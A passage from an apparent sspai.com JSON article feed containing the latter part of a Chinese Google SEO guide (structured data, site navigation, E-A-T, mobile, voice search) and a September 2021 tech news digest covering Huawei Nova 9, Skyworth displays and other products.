target=\"_blank\">功能库</a>\n</h4>\n<p>Article、book、面包屑导航、轮播界面、course、dataset、employeraggregaterating、event、事实核查、FAQ、居家活动、how、图片许可、jobposting、职业培训、本地商家、logo、数学求解器、movie、估算工资、播客、练习题、product、问答、recipe、评价摘要、站点链接搜索框、软件应用、speakable、订阅和付费内容、video。</p>\n<p>——总共 31 种类型。而对于电商来说，book、FAQ、product 和评价摘要非常实用，可以帮助商家更好的在搜索页展示商品信息，还是很值得做的。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/d36e3726d604ab7951ba8dd3212e84f2\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/04b28a82138c4a66dde772bbc2d062ea\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/d09c6bbeca9bdfb4b1ba1fd0e7e1df81\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/dde136ba4329697b6fdd1439776e0843\"><figcaption>一些案例</figcaption></figure><h4>结构化数据标记工具助手</h4>\n<p>使用 GSC 标记助手可以在不使用代码的情况下，对数据进行标注，对于没有前端代码背景的人来说非常友好。</p>\n<ul><li><a href=\"https://www.google.com/webmasters/tools/data-highlighter?hl=zh-cn&amp;siteUrl=http://liangxile.icu/\" target=\"_blank\">传送门：数据标注工具</a></li></ul>\n<h4>Google 富媒体搜索结果测试</h4>\n<p>标记完成后为了确保标记正确，我们可以借助 <a href=\"https://search.google.com/test/rich-results?hl=zh-cn\" target=\"_blank\">Google富媒体搜索结果</a> 来测试标记是否达到目的。</p>\n<h4>要避免的做法</h4>\n<ol>\n<li>使用无效标记。</li>\n<li>在对标记实现还没有把握的情况下更改网站的源代码。</li>\n<li>添加用户看不到的标记数据。</li>\n<li>制作虚假评价或添加无关标记。</li>\n</ol>\n<h2>组织网站层次结构</h2>\n<h3>清晰的网站导航</h3>\n<p>Google 建议我们要为网站建立层次清晰的导航，这样来到网站的用户才不会迷失，也会减少网站的跳失率。</p>\n<h3>使用面包屑导航</h3>\n<p>在网站的页面使用面包屑导航，这样无论用户在哪个页面都会快速地找到自己所在的位置，并将面包屑导航放在比较显眼的位置，方便用户发现。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/1d6334eb4f628d932d02f52d2c51f924\"></figure><h3>XML 站点地图文件</h3>\n<p>上文提到的站点地图文件也会起到组织网站层次的作用，并及时确保搜索引擎能够发现网站上新增网页和更新后的网页。</p>\n<h4>要避免的做法</h4>\n<ol>\n<li>创建复杂的导航链接网页，例如将网站上的所有页面都相互链接。</li>\n<li>过度拆分内容（以至于从首页前往目标内容过程中需要点击 20 次）。</li>\n<li>创建完全以图片或动画为基础的导航。</li>\n<li>导航需要使用以脚本或插件为基础的事件处理功能。</li>\n<li>任由导航页内容过期、链接损坏。</li>\n<li>创建一个只是简单罗列页面而不加以整理（例如按主题）的导航页。</li>\n<li>允许搜索引擎将您的 404 网页编入索引（确保网络服务器配置为：当请求访问不存在的网页时，返回 404 HTTP 状态代码；如果是使用 JavaScript 的网站，则包含 noindex 标记）。</li>\n<li>通过 robots.txt 文件阻止抓取 404 网页。</li>\n<li>仅提供模糊的消息，例如「未找到」、「404」或根本没有 404 页面。</li>\n<li>404 页面使用的设计与网站其他部分的设计不一致。</li>\n<li>使用含有不必要的参数和会话 ID 的冗长网址。</li>\n<li>选择使用通用网页名称，例如 page1.html。</li>\n<li>使用过多的关键字，例如 baseball-cards-baseball-cards-baseballcards.html。</li>\n<li>具有深层嵌套的子目录，例如 <code>.../dir1/dir2/dir3/dir4/dir5/dir6/page.html</code>。</li>\n<li>使用与其内容无关的目录名称。</li>\n<li>让子网域和根目录的网页访问相同内容，例如 <code>domain.com/page.html</code> 和 <code>sub.domain.com/page.html</code>。</li>\n</ol>\n<h2>优化内容</h2>\n<h3>Google EAT 原则</h3>\n<p>首先，需要说明一下的是，在现在基于 web 的网站是拥有者需要生产一些内容来进行导流的，很少有新建的网站有自带很大的流量，除非是由来已久的品牌。这样一来，如果社交平台无法从社交网络为网站带来流量的话，基本上就得靠优化搜索引擎排名来争取更多流量了。当然付费广告也是一种途径，不过不在本文的探讨范围内。</p>\n<p>确定了通过在网站生产优质内容达到导流的目的之后，我们就要看看什么样的东西才称得上是好内容。<strong>Google 对好内容有三个原则：Expertise 专业性、Authority 权威性、Trustworthiness 可信度</strong></p>\n<h4>Expertise 专业性</h4>\n<p>Google 之所以会在众多网站生产的内容当中选择把你的链接排在靠前的位置，是因为你的内容具有专业性，能给用户带来价值，这个有可能是一个产品指导说明，也有可能是一个问题的解决流程，总之就是在你所讨论的话题下，你写的内容对用户有价值，能帮助到他。</p>\n<h4>Authority 权威性</h4>\n<p>在一个话题之下，大概率有很多人或者组织都想生产自己的内容，那么 Google 考虑选谁呢？Google 还要做的一个分析是在众多内容中有哪些内容中会参考更权威的网站引用。如果有两篇文章写得话题都是如何做好 Google SEO，那么那个文章中频繁引用来自维基百科、Google SEO 官方指导文档、以及权威数据机构的链接那么他显然好于一篇没有外连接引用，或者引用不知名网站的参考资料，这就是权威性的逻辑。</p>\n<p>当然，你的文章中如果只是大量复制权威网站的链接也是不行的，需要语义通顺适合人类理解，Google 的爬虫还是很智能的，小花招是很容易被识别的，乖乖做好内容。不过有个建议：在完成内容生产后，可以检查内容当中有没有哪些东西是可以链接到像维基百科这样的权威网站的，这是一个加分项。</p>\n<h4>Trustworthiness 可信度</h4>\n<p>内容生产也必须符合可信度原则，参考的数据和文献必须真实可靠，这样用户才会给你的网站一个好的反馈，比如重复访问。</p>\n<h4>要避免的做法</h4>\n<ol>\n<li>编写的文章马虎草率，有许多拼写和语法错误。</li>\n<li>文笔欠佳。</li>\n<li>在图片和视频中嵌入文本：用户可能想复制和粘贴这些文本，但搜索引擎无法读取该文本。</li>\n<li>将大量不同主题的文字堆砌到网页上，不分隔段落、子标题或布局。</li>\n<li>稍加改动（甚至复制）现有内容几乎不能为用户带来额外价值。</li>\n<li>网站上到处是重复或近似重复的内容。</li>\n<li>插入大量针对搜索引擎的不必要关键字，这些关键字让用户感到厌烦或对他们毫无意义。</li>\n<li>含有「试图访问此网页时的常见拼写错误」等对用户几乎没有价值的文本。</li>\n<li>以欺骗手法对用户隐藏文字，但对搜索引擎显示这类文字。</li>\n<li>提供不足以阐明网页用途的内容。</li>\n<li>在您的网页上投放会分散用户注意力的广告。</li>\n<li>使用宽泛的定位文字，如「网页」、「文章」或「点击此处」。</li>\n<li>使用与主题或链接到的网页的内容无关的文字。</li>\n<li>在多数情况下将网页的网址用作定位文字。虽然这样做在某些情况下也合情合理，如宣传或引用新网站的地址。</li>\n<li>撰写很长的定位文字，如一个长句或一小段文字。</li>\n<li>使用 CSS 或文本样式，让链接看起来像常规文本。</li>\n<li>仅仅为了搜索引擎而使用冗长或关键字泛滥的定位文字。</li>\n<li>创建不利于用户在网站中导航的不必要链接。</li>\n</ol>\n<h4>建议的做法</h4>\n<ol>\n<li>保证内容准确和及时更新（SEO 2021→SEO2022）</li>\n<li>引导更多的评论并回复它们</li>\n<li>积极展示 about、team、contributors（在内容最后添加为本文做出贡献的其他人或者组织等）</li>\n<li>留下联系方式（留下你的联系方式让用户可以找到你，产生联系）</li>\n<li>社交分享（内容上线后积极在社交网站分享内容，并完成传播）</li>\n<li>邮件给订阅者发送更新（为你的网站订阅用户发送内容更新，做到不打扰用户的前提下）</li>\n<li>注意文章的实用性，对用户的指导意义。</li>\n<li>通过段落划分，合理组织文章结构（文章摘要、H1、H2、H3、H4）</li>\n<li>不要分散用户浏览的注意力-尽量减少广告</li>\n<li>如果可以在文章中提供视频、播客、PDF 下载等丰富形式的资源</li>\n<li>提供 FAQ 板块为用户解答常见的问题，当然如果有在线问答也是好的</li>\n<li>在内容长度上，尽量生产长篇深度的文章，英文词汇超过 3000 个可以作为一个参考标准</li>\n<li>视频和图片上传时注意文件名称，与页面主题相关的名称会有好处，并积极添加alt标签，更利于爬虫爬取</li>\n</ol>\n<h3>内外部链接</h3>\n<h4>内部链接</h4>\n<p>提供尽可能多的内部链接，比如电商网站可以相互链接相关的产品，以及网站中的博客文章等。</p>\n<h4>外部链接</h4>\n<p>如上所说，提供尽可能多的权威的有价值链接。这里引入一个概念-负链接。负链接指你想在文章中引用的链接但是这个链接来自竞争对手，你并不想给他导流。你可以在代码内添加 <code>rel=no follow</code> 字段，具体操作方法可以参考 <a href=\"https://developers.google.com/search/docs/advanced/robots/robots_meta_tag?hl=zh-cn\" target=\"_blank\">漫游器元标记</a>。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/article/0bcf80ffd5859ca931d0ee1d6f927352\"></figure><h3>优化图片</h3>\n<h4>建议的做法</h4>\n<ol>\n<li>使用 HTML &lt;img&gt; 或 &lt;picture&gt; 元素。</li>\n<li>为图片提供说明性文件名和 alt 属性说明。</li>\n<li>使用图片作为链接时提供替代文字</li>\n<li>添加 <a href=\"https://developers.google.com/search/docs/advanced/sitemaps/image-sitemaps?hl=zh-cn\" target=\"_blank\">图片站点地图</a>，提高图片出现在 Google 图片搜索中出现的几率。</li>\n<li>使用标准图片格式。</li>\n</ol>\n<h4>要避免的做法</h4>\n<ol>\n<li>使用 CSS 显示您希望我们编入索引的图片。</li>\n<li>在可能的情况下均使用 <code>image1.jpg</code>、<code>pic.gif</code>、<code>1.jpg</code> 等宽泛的文件名。如果您的网站有数千张图片，您可能希望自动为图片命名。</li>\n<li>文件名非常长。</li>\n<li>替代文本中充斥着关键字，或复制粘贴整个句子来作为替代文本。</li>\n<li>撰写会被认为是垃圾内容的超长替代文本。</li>\n<li>网站导航仅使用图片链接。</li>\n</ol>\n<h2>优化移动端</h2>\n<h3>响应式设计</h3>\n<p>移动端的重要性如今越来越高，并会继续增加，人们更愿意使用手机访问网站，而且很多用户在触及网站的来源很多也和社交媒体有关，所以设计一个响应式的网站兼顾 PC 端的体验是很有必要的。注意这里说的是移动端为主，并在上述所有优化时把移动端效果作为重要参考因素，不只是看看 PC 端的效果。</p>\n<h3>移动端测试</h3>\n<p>利用 <a href=\"https://search.google.com/test/mobile-friendly?hl=zh-cn\" target=\"_blank\">Google的移动端设备适合性测试</a> 检验我们网站在移动设备上的表现，并根据建议优化不足的地方。还可以通过 <a href=\"https://search.google.com/search-console/not-verified?original_url=/search-console/mobile-usability?hl%3Dzh-cn%26utm_source%3Dwmx%26utm_medium%3Ddeprecation-pane%26utm_content%3Dmobile-usability&amp;original_resource_id&amp;hl=zh-cn\" target=\"_blank\">Google search console的「移动设备易用性报告」</a>修正会对您的网站在移动设备上的易用性造成影响的问题。</p>\n<h3>要注意的问题</h3>\n<ol>\n<li>如果您动态提供内容或拥有单独的移动网站，当网页采用适合移动设备的格式时（或当网页拥有所用格式适合移动设备的对等网页时），请告知 Google。这有助于 Google 在搜索结果中准确地向移动设备搜索用户提供内容。</li>\n<li>如果您使用自适应设计，请使用 <code>meta name=\"viewport\"</code> 标记告诉浏览器如何调整内容。如果您使用的是动态提供内容功能，请使用 Vary HTTP 标头，根据用户代理指示您所做的更改。如果您使用单独的网址，则可以通过向网页添加包含 <code>rel=\"canonical\"</code> 和 <code>rel=\"alternate\"</code> 元素的 <code>&lt;link&gt;</code> 标记，指明两个网址之间的关系。</li>\n<li>确保资源可供抓取。屏蔽网页资源会致使 Google 无法了解您网站的全貌。当您的 robots.txt 文件阻止了对您的某些或所有网页资源的访问时，通常会发生这种情况。如果 Googlebot 无法访问某个网页的资源（如 CSS、JavaScript 或图片），那么我们可能无法检测出该网页是专门为了在移动设备浏览器中正常显示和运行而构建的。也就是说，我们可能无法检测到该网页是适合在移动设备上浏览的网页，因而不能以适当的方式向移动搜索用户提供该网页。</li>\n<li>避免出现会阻碍移动设备访问者访问网页的常见错误，比如存在无法播放的视频。</li>\n<li>如果移动版网页无法提供令人满意的搜索体验，那么在移动搜索结果中的排名便会下降，或是在移动搜索结果中显示时伴有警告。这类情况包括但不限于，移动设备上会妨碍用户体验的全页插页式广告。</li>\n<li>在所有设备上提供所有功能。移动用户希望网站在移动设备上提供和在其他设备上一样的功能（如发布评论和结帐）及内容。除了文字内容，确保所有重要图片和视频都已经嵌入移动版本，并且用户能通过移动设备访问。对于搜索引擎，在所有版本的网页上提供所有结构化数据和其他元数据（例如标题、说明、link 元素和其他元标记）。</li>\n<li>确保移动网站上也包含桌面网站上所有的结构化数据、图片、视频和元数据。</li>\n<li>测试并优化移动端 page speed</li>\n<li>使用 schema.org 结构化数据</li>\n<li>基于地理位置的优化</li>\n</ol>\n<h2>推广网站</h2>\n<h3>社交媒体分享</h3>\n<h4>要避免的做法</h4>\n<ol>\n<li>事无巨细地推广所创建的每一个新内容；应该推广精彩、有趣的内容。</li>\n<li>对网站采用链接方案，在这些服务中人为地置顶您的内容。</li>\n<li>将链接请求不加挑选地发给与您的主题相关的所有网站。</li>\n<li>从另一个网站购买链接，以提升 PageRank。</li>\n</ol>\n<h2>分析搜索效果和用户行为</h2>\n<h3>分析搜索效果——Google search console</h3>\n<ol>\n<li>了解 Googlebot 无法抓取网站的哪些部分</li>\n<li>测试及提交站点地图</li>\n<li>分析或生成 robots.txt 文件</li>\n<li>移除 Googlebot 已经抓取的网址</li>\n<li>指定首选网域</li>\n<li>找出 <code>title</code> 和 <code>description</code> 元标记中的问题</li>\n<li>了解用来转向网站的热门搜索</li>\n<li>了解 Googlebot 看到的网页外观如何</li>\n<li>接收质量指南违反通知，并请求重新审核网站</li>\n</ol>\n<h3>分析网站上的用户行为</h3>\n<ol>\n<li>洞悉用户如何找到您的网站以及在您的网站上有何行为</li>\n<li>发现您网站上最受欢迎的内容</li>\n<li>衡量对网站所做的优化带来的影响，例如，更改 <code>title</code> 和 <code>description</code> 元标记是否提高了搜索引擎带来的流量？</li>\n</ol>\n<h4>要注意的问题</h4>\n<ol>\n<li>浏量来源</li>\n<li>网站页面加载时间</li>\n<li>跳出率</li>\n<li>设计发爬虫机制</li>\n</ol>\n<h2>语音搜索</h2>\n<h3>要注意的问题</h3>\n<ol>\n<li>了解用户的类型和基于设备的浏览行为</li>\n<li>关注对话中的关键词（Conversational Keywords）更多的缩写词、网络流行词等可作为参考。</li>\n<li>创建基于角色的内容（Persona-Based Content）</li>\n<li>提供有框架标记的上下文（Schema Markup）</li>\n<li>FAQs Page（Who、What、Where、When、Why、How）提供更多的问答内容，解决用户的困扰。</li>\n<li>Mobile-First 语音的输入端基本都在移动端，优化移动端的必要性</li>\n<li>Local-如果可以尽可能提供本地服务</li>\n</ol>\n<h2>SEO 自动化</h2>\n<p>自动化在 SEO 领域并不算冷门的话题，在需要处理大量数据的时候自动化确实给我们节省很多的时间。关于 SEO 的自动化，我们可以做的有以下几个方面：</p>\n<ol>\n<li>网站监控，我们对网站的内容做了优化之后都需要看看更改之后的浏览数据是否得到了提升，这个时候就需要监控用户浏览时间，跳出率等等帮助我们做决策、</li>\n<li>排名跟踪，如果我们网站有很多个网页都出现在搜索结果页的排名中，那么定期查看排名的变化情况就很有必要了。</li>\n<li>反向链接分析，当我们网站被很多其他网页频繁引用时，分析反向链接就变成了一个大量的工作，通过自动化的分析可帮助我们省去很多时间。</li>\n<li>自动化监控竞争对手，通过自动化监控竞争对手的网站可以帮助我们快速看到对手的变化和策略，从而应对自如。</li>\n</ol>\n<h2>拓展链接</h2>\n<ul>\n<li><a href=\"https://developers.google.com/search/docs/beginner/seo-starter-guide?hl=zh-cn\" target=\"_blank\">Google 搜索引擎优化（SEO）新手指南</a></li>\n<li><a href=\"https://search.google.com/search-console?hl=zh-cn\" target=\"_blank\">Google Search Console</a></li>\n<li><a href=\"https://zh.wikipedia.org/zh-hans/Wikipedia:%E9%A6%96%E9%A1%B5\" target=\"_blank\">维基百科</a></li>\n<li><a href=\"https://themeisle.com/blog/meta-description-examples/\" target=\"_blank\">15 Meta Description examples，plus how to write a perfect Meta Description</a></li>\n<li><a href=\"https://www.webfx.com/internet-marketing/seo-automation.html\" target=\"_blank\">SEO Automation: 7 SEO Automation Tools that Boost Efficiency</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\">冲！</a></p>\n","link":"https://sspai.com/post/68905"},{"title":"派早报：创维发布多款新品、华为发布 Nova 9 系列手机等","date":"2021-09-24 00:45:20","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>创维发布多款新品</h3>\n<p>9 月 23 日，创维发布了 S82、Q72、G90 等多款新品。G90 是创维发布首款 OLED 电竞显示器，采用了 4K 120Hz 48 英寸 OLED 面板，支持 1ms 的灰阶响应，对比度高达 10000000:1，色深可达 10bit，可视角高达 178 °，售价 14999 元。<a href=\"https://m.weibo.cn/detail/4684692965559603\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfhlb34takvpmlvc0.png\"></figure><p>S82 拥有 55″、65″、77″ 和 83″ 四种尺寸，这是一款主打高色准的 OLED 电视，△E 达到 0.86，最高 1000nits HDR 峰值亮度色域，99.17% DCI-P3 色域，10bit 色深。此外也拥有 HDMI 2.1 接口，支持 VRR、AMD FreeSync，游戏主机可实现 4K 120Hz 画面，55 寸首发价格 ￥11999 起售。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfhtb34taj5bdobmg.png\"></figure><p>Q72 为 Mini LED 电视，最高 20736 颗灯珠，2304 物理分区背光，峰值亮度为 1500nits，对比度 100 万 : 1，拥有 75″、86″ 两个尺寸，首发￥24999 起售。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfi5b34tajfh55tr0.png\"></figure><h3>华为发布 Nova 9 系列手机</h3>\n<p>华为于 9 月 23 日召开线上发布会，正式发布了华为 Nova 9 系列两款新机：华为 Nova 9 和 Nova 9 Pro。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfilb34taja4rodrg.png\"></figure><p> </p>\n<p>前置镜头方面，华为 Nova 9 搭配 3200 万像素高清人像镜头，华为 Nova9 Pro 则是搭配了 3200 万像素超广角摄像头 + 3200 万像素人像摄像头的豪华配置，华为独创前置双目立体视觉影像系统，可以让两个镜头协同工作，通过算法对两张不同的算法进行计算处理，叠加出一张背景立体、人物主题突出、色彩鲜明的照片，还支持丰富的虚化模式以拍摄出不同的照片。超广角镜头让取景范围更广，同时还能通过算法修复畸变，两个镜头均支持超广角 4K 视频拍摄，搭配 AIS+3D 人像防抖，内置3个麦克风，立体收音+AI声音算法，可以实现对焦时声音平滑跟随变换。</p>\n<p>后置方面，配备了 5000 万像素 RYYB 主摄的超感知影像系统。主摄拥有1/1.56英寸的传感器感光面积，华为 Nova 9 系列还配备有800万像素超广角摄像头、独立景深摄像头、以及4厘米的微距摄像头。</p>\n<p>性能方面，华为 Nova 9 系列标配了 10.7 亿色的 120Hz 刷新率屏幕，支持 300Hz 触控采样率，支持全新 Touch Turbo 技术。华为 Nova 9 支持 66W 快充，华为 Nova9 Pro 支持 100W 的华为新一代超级快充。</p>\n<p>外观上宛如梦境般的 9 号色与全新升级的独特星耀环巧妙融合，不断探索手机色彩美学，机身采用星耀工艺，更加耀目出众，带来视觉新体验。还拥有亮黑色、普罗旺斯、绮境森林配色。售价上 Nova 9 起售价 2699 元，Nova 9 Pro 起售价 3499 元，即日起预售，9 月 29 日正式开售。<a href=\"https://www.ithome.com/0/577/145.htm\" target=\"_blank\">来源</a></p>\n<h3>iQOO 发布 Z5 系列手机</h3>\n<p>9 月 23 日，iQOO 举办新品发布会，正式发布 iQOO Z5 智能手机，该设备采用了 6.67 英寸 120Hz 原色屏幕，搭载高通骁龙 778G 处理器，并配备 VC 液冷散热系统以及立体声双扬声器。影像方面，iQOO Z5 搭载 6400 万超清三摄，支持星空模式、人像模式、运动抓拍等等。本次共三个版本以及三种配色，售价 1899 元起。<a href=\"https://www.vivo.com.cn/vivo/iqooz5/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfitb34takvpmlvcg.png\"></figure><h3>Google 向用户开放广告商相关信息</h3>\n<p>9 月 23 日，因近期收到用户关于搜索引擎中广告诈骗的举报信息，Google 更新官网博客，宣布开始向用户公布更多有关广告商的信息，除了基本信息以外，用户还可以查看该厂商在过去 30 天中投放的所有广告项目，帮助用户更快速的判断广告的真实性。<a href=\"https://blog.google/products/ads-commerce/giving-users-more-transparency-their-google-ad-experience/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfj5b34taj5bdobn0.png\"></figure><h3>魅族推出多款 Lipro 智能家居</h3>\n<p>9 月 22 日，魅族召开新品发布会，推出了 Lipro 系列智能家居，与此同时也宣布 Lipro 系列智能家居将接入 Homekit 生态，第一款正式接入的产品是智能窗帘机。该设备支持 50kg 的最大承重，工作声音小于 35dB，开合速度可达 350px/s，售价 899 元。<a href=\"https://weibo.com/7539191685/KyptK0ihB\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfjdb34tajfh55trg.png\"></figure><h3>Android 将推出多项新功能</h3>\n<p>Google 宣布将为 Android 用户带来多项新功能，首先针对运动和语言障碍人士推出了新的辅助功能：用户可以通过前置摄像头，使用面部表情动作来控制手机；同时通过 Project Activate 来记录眼球运动和面部表情，并激活预设的动作，例如说出短语、播放音频等等，另外 Lookout 使用摄像头帮助弱视更快的完成文本工作，在文档模式下可以将记录的文本读出来，目前支持拉丁语言，未来在货币模式下还将添加欧元和印度卢比的识别。</p>\n<p>对于家用有 Google TV 的用户，则可以通过内置远程控制功能的 Android 手机进行操作，甚至可以使用手机键盘来输入密码、搜索影片名称以及关键字，并可以将远程磁贴添加到 Android 的快速设置中。</p>\n<p>现在你还可以通过 Google 助理来跟踪日常待办事项，只需要语音唤醒「Hey Google，打开我的提醒」来管理所有提醒，并可以看到相应的有用建议。</p>\n<p>Android Auto 中则加入多项实用功能，你可以在等待的时候玩 GameSnacks 提供的各种游戏，双卡 Android 用户现在可以在通过 Android Auto 拨打电话时选择实用那张电话卡；Waze 也进行了更新，新的设计包括触摸板支持、夜间模式和车道引导支持，并将地图和方向放在最前面，因此其他元素不会妨碍。</p>\n<p>此前在 Pixel 上推出的 Google 相册锁定文件夹功能将向 Android 用户推出，保存到这个文件的视频以及照片需要用密码打开；Gboard 中在秋季将推出 1500 表情贴纸，同时将针对复制内容进行分段提取，此前截图将可以显示为分享建议内容。<a href=\"https://blog.google/products/android/new-android-features-coming-season/\" target=\"_blank\">来源</a></p>\n<h3>Xbox 立体声耳机正式在国内发售</h3>\n<p>微软于 9 月 23 日正式在国内发售 Xbox 立体声耳机，耳机采用 3.5mm 接口连接，整体黑色、表面采用磨砂处理，配备一个不可拆卸的麦克风，音效上支持 Windows Sonic 空间音效，兼容杜比全景声以及 DTS headphone:X 音效，支持的设备包括 Xbox Series X|S、Xbox One 以及 Windows PC。整体采用轻量化设计，头带可调节，耳罩内部具有海绵软垫，外部覆盖柔软的皮革材质。参数方面，耳机阻抗 32 欧姆，频响范围 20Hz-20kHz，售价为 419 元。<a href=\"https://www.ithome.com/0/577/101.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfjlb34taja4rods0.png\"></figure><h3>蔚来发布三元铁锂标准续航电池包</h3>\n<p>蔚来于 9 月 23 日发布三元铁锂标准续航电池包（75kWh），该电池包采用三元锂与磷酸铁锂电芯混合排布的方式，可实现低温续航损失降低 25%，电量估算精度与三元锂电池一致，以及应用了新一代 CTP 技术，制造装配简化 10% ，体积利用率提升 5%，能量密度提升 14%，达 142Wh/kg。即日起开放预定，新购车用户可以选择三元铁锂标准续航电池包（75kWh）或三元锂长续航电池包（100kWh），三元铁锂标准续航电池包（75kWh）车型，其售价、BaaS 价格、换电权益、续航升级权益等与原三元锂 70kWh 电池包车型相同。<a href=\"https://www.ithome.com/0/577/023.htm\" target=\"_blank\">来源</a></p>\n<h3>希捷宣布开发第二代 HAMR 技术</h3>\n<p>希捷于 9 月 23 日在花旗银行举办的全球技术会议上宣布，正在开发采用第二代 HAMR 技术的机械硬盘，其容量可以提升至 30TB。根据此前消息希捷计划在 2025 年推出 50TB 的 HDD。希捷独家的 HAMR 技术在磁头附近有一个小型激光二极管，可以瞬间加热磁盘表面，使得写入区域的磁颗粒更容易翻转磁性，帮助磁头进行写入，每个单位会在一纳秒内完成加热并冷却，这项技术对整个介质的温度、稳定性或可靠性完全没有影响。<a href=\"https://www.ithome.com/0/577/167.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56hfjtb34taja4rodsg.png\"></figure><h3>YouTube 正在测试基于桌面浏览器的离线下载功能</h3>\n<p>YouTube 正在为在桌面浏览器使用 YouTube 的高级订阅用户提供一项新测试功能：离线下载，用户可以在「尝试实验性的新功能」页面中点击参与「从浏览器下载视频」的测试功能，开启之后用户可以在看到在「共享」和「保存」按钮之间有个新的「下载」按钮，可以下载的视频最高只有 1080p，并不支持 4K 视频下载。<a href=\"https://9to5google.com/2021/09/22/youtube-desktop-video-download/\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>据科技博主差评帝爆料称，将于 9 月 26 日发布的 OPPO Watch Free 将拥有睡眠模式、就寝提醒、熬夜提醒、护眼模式，并且支持游戏模式心率检测、打车通知、语音助手等诸多特性。<a href=\"https://www.ithome.com/0/577/007.htm\" target=\"_blank\">来源</a>\n</li>\n<li>据 DigiTimes 于 9 月 23 日发布的一项报告显示，Apple 首款 AR 头戴式设备已经完成第二阶段原型机测试，将进入工程验证测试阶段，预计将会在 2022 年下半年上市，据悉 Apple 的 AR 设备规划会推出两款，一款为高端机型，定位为商用产品，内含镜头与激光传感器，重量约 100~110 克，采用 5 纳米制程芯片，然而仍需通过蓝牙连线至 iPhone 搭配使用，镜框部分将采用高强度轻量化含有微量稀土元素的镁合金材料。<a href=\"https://www.ithome.com/0/577/032.htm\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒报道，欧盟建议在所有使用有线充电器电子设备强制采用 USB-C 接口。<a href=\"https://www.theverge.com/2021/9/23/22626723/eu-commission-universal-charger-usb-c-micro-lightning-connector-smartphones\" target=\"_blank\">来源</a>\n</li>\n<li>小米 K16 相关信息曝光，一共包含三款机型，分别配备 33W、67W、120W 充电器，<a href=\"https://www.ithome.com/0/577/132.htm\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购<strong>八折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>\n<a href=\"https://emojipedia.org/mobile-phone/\" target=\"_blank\">📱</a> 你有同时用两部手机的习惯或者经历吗？不妨去 <a href=\"https://sspai.com/bullet/1632293763\" target=\"_blank\">一派</a> 和大家聊聊你是怎么用的。</li>\n<li>🦦 少数派「监工水獭」挂灯摆件 <a href=\"https://item.taobao.com/item.htm?id=656156847801\" target=\"_blank\">正式上架</a>，上新特惠 ￥49（原价 ￥69）。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68760\">浮名迷真性，硬核助本心——浅谈苹果的命名困局</a></li>\n<li><a href=\"https://sspai.com/post/68936\">微软想让你不再动手输密码了，这个省事的方案有多安全？</a></li>\n<li><a href=\"https://sspai.com/prime/story/1pw8-disputes\">订阅、云服务、套壳——关于 1Password 8 的是非争议</a></li>\n<li><a href=\"https://sspai.com/post/68125\">居家不止冰啤酒 ，这份「家庭鸡尾酒」调制公式敬请收藏</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68951"},{"title":"居家不止冰啤酒 